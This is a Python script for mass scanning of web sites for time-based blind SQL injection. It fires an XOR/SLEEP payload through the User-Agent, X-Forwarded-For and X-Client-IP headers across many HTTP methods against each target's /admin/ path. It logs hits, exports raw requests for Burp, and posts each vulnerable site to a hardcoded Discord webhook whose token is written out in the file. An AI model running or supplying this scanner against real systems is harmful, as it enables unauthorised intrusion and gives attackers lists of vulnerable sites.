import requests
import argparse
import time
import random
import urllib3
import os
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1349097606709510328/OAvRLvmJcUjqpR6Ruzh_quEaN4OeIwXtLXz2fv5i1Fy9FMSdfJq4NDfAC6lKqNR3b2LU"

PROXIES = {
    # "http": "http://127.0.0.1:8080",
    # "https": "http://127.0.0.1:8080"
}

payload = 'nvn"xor(if(now()=sysdate(),SLEEP(8),0))xor"nvn'

base_headers = {
    "User-Agent": "normal-useragent",
    "X-Forwarded-For": "normal-xff",
    "X-Client-IP": "normal-clientip",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "*/*"
}

headers_to_test = ["User-Agent", "X-Forwarded-For", "X-Client-IP"]

methods_to_test = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "PATCH"]

timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
output_file = "vulnerable_targets_%s.txt" % timestamp
requests_folder = "requests_%s" % timestamp

if not os.path.exists(requests_folder):
    os.makedirs(requests_folder)

def send_discord_alert(url, method, header, attack_headers):
    if DISCORD_WEBHOOK:
        try:
            data = {
                "content": "🚨 **SQLi Vulnerable**\n**URL:** `%s`\n**Method:** `%s`\n**Injected Header:** `%s`\n**Attack Headers:**\n```%s```" % (
                    url, method, header, "\n".join("%s: %s" % (k, v) for k, v in attack_headers.items())
                )
            }
            requests.post(DISCORD_WEBHOOK, json=data, proxies=PROXIES, verify=False)
        except Exception as e:
            print(Fore.YELLOW + "[!!] Discord alert failed: %s" % str(e) + Style.RESET_ALL)

def save_raw_request(url, method, headers, injected_header, body=None):
    try:
        hostname = url.split("//")[-1]
        filename = "%s/%s_%s_%s.txt" % (requests_folder, hostname.replace("/", "_"), method, injected_header.replace("-", ""))
        path = "/admin/"
        host_header = hostname
        raw = "%s %s HTTP/1.1\r\n" % (method, path)
        raw += "Host: %s\r\n" % host_header
        for header_key, header_value in headers.items():
            raw += "%s: %s\r\n" % (header_key, header_value)
        raw += "Connection: close\r\n"
        raw += "\r\n"
        if body:
            raw += body + "\r\n"
        with open(filename, "w") as f:
            f.write(raw)
    except Exception as e:
        print(Fore.YELLOW + "[!!] Failed to save raw request: %s" % str(e) + Style.RESET_ALL)

def is_vulnerable(url, method, injected_header):
    try:
        headers = base_headers.copy()
        headers[injected_header] = payload
        start = time.time()
        if method == "GET":
            response = requests.get(url + "/admin/", headers=headers, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "GET", headers, injected_header)
        elif method == "POST":
            response = requests.post(url + "/admin/", headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "POST", headers, injected_header, "test=test")
        elif method == "PUT":
            response = requests.put(url + "/admin/", headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "PUT", headers, injected_header, "test=test")
        elif method == "OPTIONS":
            response = requests.options(url + "/admin/", headers=headers, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "OPTIONS", headers, injected_header)
        elif method == "HEAD":
            response = requests.head(url + "/admin/", headers=headers, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "HEAD", headers, injected_header)
        elif method == "PATCH":
            response = requests.patch(url + "/admin/", headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=PROXIES)
            save_raw_request(url, "PATCH", headers, injected_header, "test=test")
        else:
            return False, None, None
        duration = time.time() - start
        return duration > 7.5, response.status_code, method
    except Exception:
        return False, None, method

def main(file_path):
    with open(file_path, 'r') as f:
        raw_urls = [line.strip() for line in f if line.strip()]

    urls = []
    for line in raw_urls:
        if not line.startswith("http://") and not line.startswith("https://"):
            line = "https://" + line
        urls.append(line)

    random.shuffle(urls)

    print("\n[+] Loaded %d targets. Starting scan...\n" % len(urls))

    for idx, url in enumerate(urls):
        print("\n[%d/%d] Testing: %s" % (idx + 1, len(urls), url))
        random.shuffle(methods_to_test)
        for method in methods_to_test:
            random.shuffle(headers_to_test)
            for header in headers_to_test:
                print("  [*] Trying %s with header %s..." % (method, header))
                vulnerable, status, used_method = is_vulnerable(url, method, header)
                if vulnerable:
                    print(Fore.GREEN + "  [!!] Vulnerable! %s | Status: %s | Method: %s | Header: %s" % (url, status, used_method, header) + Style.RESET_ALL)
                    with open(output_file, "a") as out:
                        out.write("%s | %s | %s\n" % (url, used_method, header))
                        out.flush()
                        os.fsync(out.fileno())
                    send_discord_alert(url, used_method, header, base_headers)
                    break
                else:
                    color = Fore.RED if status else Fore.YELLOW
                    print(color + "  [--] Not vulnerable | Status: %s" % (status if status else "Error/Timeout") + Style.RESET_ALL)
                time.sleep(3)
            else:
                continue
            break

    print("\n[+] Scan finished. Vulnerable results saved in: %s" % output_file)
    print("[+] Raw HTTP requests saved inside folder: %s\n" % requests_folder)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multi-Method SQLi Scanner + Header Fuzzing + Burp Export + Random Shuffle + Instant Save")
    parser.add_argument("-f", "--file", required=True, help="Path to file with target URLs")
    args = parser.parse_args()
    main(args.file)
